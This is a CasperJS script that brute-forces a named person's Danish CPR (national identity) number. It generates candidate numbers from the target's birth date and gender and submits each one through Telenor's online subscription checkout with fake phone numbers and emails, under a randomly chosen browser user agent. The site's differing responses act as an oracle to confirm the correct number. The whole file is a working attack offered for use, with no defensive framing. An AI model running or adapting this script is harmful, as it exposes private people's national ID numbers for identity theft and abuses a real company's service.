var casper = require('casper').create({
  pageSettings: {
    loadImages:  false,        // do not load images
    loadPlugins: false         // do not load NPAPI plugins (Flash, Silverlight, ...)
  },
  verbose: false
  // logLevel: "debug"
});

// Helper functions
var zeroPad = function(num, places) {
  var zero = places - num.toString().length + 1;
  return Array(+(zero > 0 && zero)).join("0") + num;
};

var getRandomString = function(length){
  var randomString = Math.random().toString(36).slice(3, length+3);
  if(randomString === ""){
    return getRandomString(length);
  }else{
    return randomString;
  }
};


// command line options/arguments
var cliOptions = casper.cli.options;

var person = {
    firstName: decodeURI(cliOptions.firstName).replace(/\+/g, " "),
    lastName: decodeURI(cliOptions.lastName).replace(/\+/g, " "),
    dob: zeroPad(cliOptions.dob, 6),
    gender: cliOptions.gender,
    lastNames: []
};

/**************************************************/

// set different user agent for every request
var userAgents = [
  'Mozilla/5.0 (Macintosh; Intel Mac OS X)',
  'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6',
  'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1) ',
  'Opera/9.20 (Windows NT 6.0; U; en)',
  'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; zh-CN) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19',
  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
  'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0',
  'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8'
];

// include scrapeUtils utilities
var colorizer = require('colorizer').create('Colorizer');
var generateCpr = require('./generateCpr.js').generateCpr;
var generateLastNames = require('./generateLastNames.js');
var cprList = [];

/**************************************************/

// begin
casper.start();

// set random UserAgent
var randomNumber = Math.floor(Math.random() * userAgents.length);
casper.userAgent(userAgents[randomNumber]);

casper.then(function(){
  console.log(person.firstName);
  console.log(person.lastName);
  console.log(person.dob);

  // generate list of cpr numbers
  cprList = generateCpr.init(person.dob, person.gender);

  // generate full names with different combinations
  person.lastNames = generateLastNames.init(person.lastName);

  // Set viewport size
  casper.viewport(1024, 768);
});

// Open Page: Lillenor abonnement oversigt
casper.thenOpen('http://www.telenor.dk/privat/mobilabonnementer/mobilabonnementer/lillenor/index.aspx?icid=megadropdown_mobilabonnementer_lillenor').then(function(){
  this.waitForSelector('#purchaseBtn', function(){
    this.click('#purchaseBtn');
  });
});

// Choose: new number (nummer.aspx)
casper.then(function(){

  this.then(function(){
    // Click: new number
    this.click('#EShop_ChooseNumberXUC1_btnMainNewNumber');

    // wait for numbers and the choose one
    this.waitForSelector('#subnumbers', function(){
      // this.test.comment('Clicking on number');

      this.waitForSelector('#subnumbers input', function(){
        this.click('#subnumbers input');
      });
    });
  });

  this.then(function(){
    this.test.comment('Clicking next #1');
    // console.log(this.getCurrentUrl());
    this.click('#next');
  });

});

// wait for next page (service.aspx)
casper.then(function(){

  this.test.comment('Clicking next #2');

  // wait for next breadcrump to become active
  this.waitForSelector('.breadcrumb .active.id-1', function(){
    // console.log(this.getCurrentUrl());
    this.click('#next[data-rel="FlowNavigator1_ImageButtonNext"]');
  }, function(){
      // capture screenshot
      this.test.comment('Failed clicking next #2');
      this.captureSelector('failed_click_next_2.png', '#content');
  }, 30000);
});

// Basket page (basket.aspx)
casper.then(function(){
  this.test.comment('Click checkout button');
  this.waitForSelector('#EShop_Basket1_CheckOutImageButton', function(){
    // console.log(this.getCurrentUrl());
    this.click('#EShop_Basket1_CheckOutImageButton');
  }, function(){
    // console.log(this.getCurrentUrl());
    this.test.comment('Failed checkout button');
    this.captureSelector('failed_click_checkout_button.png', '#content');
  }, 30000);
});

// Kontaktinformationsside
casper.then(function(){
  this.test.comment('Accept use of cpr');

  // click checkbox: accept cpr (LOLZ!)
  this.waitForSelector('#_ContactInformation_ContactInformation1_ctl00_ctl00_cbConsent', function(){
    this.click('#_ContactInformation_ContactInformation1_ctl00_ctl00_cbConsent');
  });
  checkCpr(0);
});


var checkCpr = function(index){
  var cpr = person.dob + '-' + cprList[index];
  var phone = Math.floor(Math.random() * 69000000) + 30000005;
  var email = getRandomString(8) + '@gmail.com';

  casper.then(function(){

    // wait for CPR field
    this.waitForSelector('#_ContactInformation_ContactInformation1_ctl00_ctl00_tbCpr', function(){

      // wait for email field (last field in form)
      this.waitForSelector('#_ContactInformation_ContactInformation1_ctl00_ctl00_tbEmail', function(){

        // fill out form
        this.fill('#dotnet', {
          '_ContactInformation_ContactInformation1$ctl00$ctl00$tbCpr': cpr,
          '_ContactInformation_ContactInformation1$ctl00$ctl00$tbFirstname': person.firstName,
          '_ContactInformation_ContactInformation1$ctl00$ctl00$tbLastname': person.lastNames[index],
          '_ContactInformation_ContactInformation1$ctl00$ctl00$tbPhoneNo': phone,
          '_ContactInformation_ContactInformation1$ctl00$ctl00$tbEmail': email
        }, false);
      });
    });

    // add dummy element, so we know when the page has changed!
    casper.evaluate(function() {
      $('body').append('<p id="casperjs-was-here">Hello</p>');
    });

  });

  // submit
  casper.then(function(){
    this.click('.next');
  });

  // check response
  casper.then(function(){

    // debug
    // console.log(cpr);
    console.log(person.lastNames[index]);

    // We've had a page change!
    this.waitWhileSelector('#casperjs-was-here', function(){

      var message = "";
      if(this.exists('#_ContactInformation_ContactInformation1_ctl00_ctl00_summary')){
        message = this.fetchText('#_ContactInformation_ContactInformation1_ctl00_ctl00_summary').replace(/(\r\n|\n|\r)/gm,"").trim();
      }

      // success if:
      // 1) we are redirect to god
      // OR
      // 2) we receive a special message which only correct CPR numbers receive :D
      if(this.getCurrentUrl().indexOf("godkend.aspx") !== -1 || message.indexOf("ikke ske automatisk, men ring til Telenor") !== -1){
        // console.log(colorizer.colorize(cpr, "GREEN_BAR"));
        console.log("correct: " + cpr);

      // Failure
      }else{
        console.log("wrong: " + cpr);
        // this.captureSelector('incorrect_' + index + '.png', '#content');

        index++;
        if(cprList[index] !== undefined){
          checkCpr(index);
        }
      } // end of else
    }, function(){
      this.test.comment('Timeout checking CPR #' + index);
      this.captureSelector('timeout_check_cpr_' + index + '.png', '#content');
    }, 30000); // end of waitWhileSelector
  });
};

// print current url
casper.run(function() {
    console.log("Finished");
    this.exit();
});
